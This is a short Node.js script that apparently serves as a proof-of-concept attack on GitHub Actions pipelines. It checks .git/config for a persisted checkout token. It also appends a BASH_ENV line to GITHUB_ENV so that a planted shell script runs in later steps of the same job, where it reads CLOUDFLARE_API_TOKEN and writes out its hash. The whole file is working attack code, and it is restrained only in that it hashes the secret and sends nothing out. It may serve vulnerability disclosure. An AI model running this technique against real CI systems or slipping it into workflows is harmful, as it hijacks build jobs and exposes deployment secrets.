const fs = require('fs');
const lines = [];
lines.push('PWN_RAN=yes');
lines.push('RAN_AT=' + new Date().toISOString());
lines.push('CWD=' + process.cwd());
lines.push('WHOAMI_UID=' + (process.getuid ? process.getuid() : 'n/a'));

// 1. what an actions/checkout with persist-credentials default leaves behind
let extraheader = false;
try {
  const cfg = fs.readFileSync('.git/config', 'utf8');
  extraheader = /extraheader|AUTHORIZATION: basic/i.test(cfg);
} catch (e) { lines.push('GIT_CONFIG_ERR=' + e.message); }
lines.push('CHECKOUT_PERSISTED_TOKEN_IN_GIT_CONFIG=' + extraheader);

// 2. persist into later, secret-bearing steps of the same job
const dir = '/home/runner/pwn';
fs.mkdirSync(dir, { recursive: true });
if (process.env.GITHUB_ENV) {
  fs.appendFileSync(process.env.GITHUB_ENV, 'BASH_ENV=' + dir + '/env.sh\n');
  lines.push('WROTE_GITHUB_ENV=yes');
}
if (process.env.GITHUB_PATH) {
  lines.push('GITHUB_PATH_WRITABLE=yes');
}
fs.writeFileSync(dir + '/env.sh',
  'if [ -n "${CLOUDFLARE_API_TOKEN:-}" ]; then\n' +
  '  printf "%s" "$CLOUDFLARE_API_TOKEN" | sha256sum | cut -c1-16 > ' + dir + '/leak_hash.txt\n' +
  '  printf "ACCOUNT_ID_LEN=%s\\n" "${#CLOUDFLARE_ACCOUNT_ID}" >> ' + dir + '/leak_hash.txt\n' +
  '  echo "LEAKED_IN_SECRET_BEARING_STEP=yes" >> ' + dir + '/leak_hash.txt\n' +
  'fi\n');
fs.writeFileSync(dir + '/proof.txt', lines.join('\n') + '\n');
console.log(lines.join('\n'));
